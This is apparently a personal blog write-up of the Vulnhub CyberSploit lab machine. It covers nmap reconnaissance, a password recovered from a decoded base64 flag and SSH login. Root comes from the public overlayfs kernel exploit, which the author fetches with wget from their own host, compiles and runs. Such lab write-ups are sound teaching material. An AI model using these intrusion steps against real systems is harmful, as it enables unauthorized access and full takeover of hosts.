---
title: Vulnhub - CyberSploit
description: My writeup on CyberSploit box.
categories:
 - vulnhub
tags: vulnhub base64 ssh binary kernel searchsploit
---

![](https://i2.wp.com/lifars.com/wp-content/uploads/2020/04/Top-10-most-dangerous-Cyber-Virus-scaled.jpg?fit=2560%2C1500&ssl=1)

Hi all, i really hate this type of boxes, but anyway let's pwn it!

You can find the machine there > [CyberSploit](https://www.vulnhub.com/entry/cybersploit-1,506/){:target="_blank"}

## Enumeration/Reconnaissance

Let's start always with nmap.

```
$ ip=192.168.1.7
$ cybersploit nmap -sC -sV -p- -oN nmap/initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-10 12:47 EEST
Nmap scan report for 192.168.1.7
Host is up (0.0013s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 01:1b:c8:fe:18:71:28:60:84:6a:9f:30:35:11:66:3d (DSA)
|   2048 d9:53:14:a3:7f:99:51:40:3f:49:ef:ef:7f:8b:35:de (RSA)
|_  256 ef:43:5b:d0:c0:eb:ee:3e:76:61:5c:6d:ce:15:fe:7e (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Hello Pentester!
MAC Address: 00:0C:29:3A:64:E3 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

If we check page source code we can see this comment: `<!-------------username:itsskv--------------------->` Probably a system user. Then i always check `/robots.txt` there, a base64 string exists let's decode it.

```
$ echo R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9 | base64 -d
Good Work !
Flag1: cybersploit{youtube.com/c/cybersploit}
```

## Shell as itsskv

After this i tried ton of stuff, brute force with custom wordlist with `cewl`, custom wordlist with `john`, brute force with `rockyou.txt` nothing. Then i had a crazy idea to try `cybersploit{youtube.com/c/cybersploit}` as password and it worked. LOL

```
$ ssh itsskv@$ip
itsskv@192.168.1.7's password: 
Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

332 packages can be updated.
273 updates are security updates.

New release '14.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Your Hardware Enablement Stack (HWE) is supported until April 2017.

Last login: Fri Jul 10 15:11:03 2020 from 0xatom.zte.com.cn
itsskv@cybersploit-CTF:~$ 
```

The second flag:

```
itsskv@cybersploit-CTF:~$ cat flag2.txt | perl -lape '$_=pack"(B8)*",@F'
good work !
flag2: cybersploit{https:t.me/cybersploit1}
```

## Exploiting old kernel version

Now privesc to root, is kernel exploit. Let's check kernel version:

```
itsskv@cybersploit-CTF:~$ uname -a
Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
itsskv@cybersploit-CTF:~$ uname -r
3.13.0-32-generic
```

Seems really old, let's search for possible exploits.

```
searchsploit 3.13.0
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                         |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                                                   | linux/local/37292.c
```

Seems good, let's mirror it and transfer it to target box.

```
$ searchsploit -m linux/local/37292.c
  Exploit: Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/37292
     Path: /usr/share/exploitdb/exploits/linux/local/37292.c
File Type: C source, ASCII text, with very long lines, with CRLF line terminators

Copied to: /root/Documents/vulnhub/cybersploit/37292.c

$ cybersploit python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now let's wget it to target box and compile it.

```
itsskv@cybersploit-CTF:~$ cd /tmp
itsskv@cybersploit-CTF:/tmp$ wget -q 192.168.1.16/37292.c
itsskv@cybersploit-CTF:/tmp$ gcc 37292.c -o r00t; chmod +x r00t
itsskv@cybersploit-CTF:/tmp$ ./r00t
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami;id
root
uid=0(root) gid=0(root) groups=0(root),1001(itsskv)
```

Let's read the final flag:

```
# cat finalflag.txt
  ______ ____    ____ .______    _______ .______          _______..______    __        ______    __  .___________.
 /      |\   \  /   / |   _  \  |   ____||   _  \        /       ||   _  \  |  |      /  __  \  |  | |           |
|  ,----' \   \/   /  |  |_)  | |  |__   |  |_)  |      |   (----`|  |_)  | |  |     |  |  |  | |  | `---|  |----`
|  |       \_    _/   |   _  <  |   __|  |      /        \   \    |   ___/  |  |     |  |  |  | |  |     |  |     
|  `----.    |  |     |  |_)  | |  |____ |  |\  \----.----)   |   |  |      |  `----.|  `--'  | |  |     |  |     
 \______|    |__|     |______/  |_______|| _| `._____|_______/    | _|      |_______| \______/  |__|     |__|     
                                                                                                                  

   _   _   _   _   _   _   _   _   _   _   _   _   _   _   _  
  / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
 ( c | o | n | g | r | a | t | u | l | a | t | i | o | n | s )
  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 

flag3: cybersploit{Z3X21CW42C4 many many congratulations !}

if you like it share with me https://twitter.com/cybersploit1.

Thanks !
```

Big meme box.
